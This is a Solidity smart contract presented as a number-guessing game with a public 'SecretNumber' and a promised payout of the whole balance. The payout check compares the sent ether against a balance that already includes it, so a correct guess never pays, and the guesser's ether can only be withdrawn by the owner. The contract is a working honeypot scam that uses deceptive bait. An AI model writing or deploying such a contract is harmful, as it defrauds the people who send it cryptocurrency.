pragma solidity ^0.4.19;
contract GuessTheNumber {

    address private Owner = msg.sender;
    uint public SecretNumber = 24;

    function() public payable {}
   
    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Guess(uint n) public payable {
        if(msg.value >= this.balance && n == SecretNumber && msg.value > 0.25 ether) {
            // Previous Guesses makes the number easier to guess so you have to pay more
            msg.sender.transfer(this.balance+msg.value);
        }
    }
}